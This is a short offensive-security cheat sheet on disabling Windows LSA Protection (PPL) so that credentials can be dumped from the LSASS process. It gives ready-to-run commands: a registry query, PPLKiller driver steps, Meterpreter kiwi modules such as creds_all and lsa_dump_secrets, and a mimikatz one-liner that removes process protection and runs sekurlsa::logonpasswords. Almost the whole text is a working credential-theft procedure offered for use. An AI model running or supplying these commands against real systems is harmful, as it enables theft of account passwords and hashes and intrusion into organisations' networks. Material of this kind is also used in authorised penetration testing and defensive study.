### Check if PPL is enabled
CMD: `reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL`

### Disable PPL using PPLKiller

- Make sure the session you are running with has SYSTEM privleges.
- We need to upload the driver to the path: `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - `mkdir Temp`.
- Then we will disable PPL: `.\PPLKiller.exe /disablePPL <LSASS PID>`
- Now we can use meterpreter mimikatz module to dump the lsass process: `load kiwi` - `creds_all` - `lsa_dump_secrets`.

### Disable PPL using mimikatz
- Transfer both `mimikatz.exe` and `mimidrv.sys` to the same directory, e.g `C:\Windows\Tasks`.
- Run: `.\mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "sekurlsa::logonpasswords" "exit"`
- Restore: `.\mimikatz.exe "!processprotect /process:lsass.exe" "!-" "exit"`
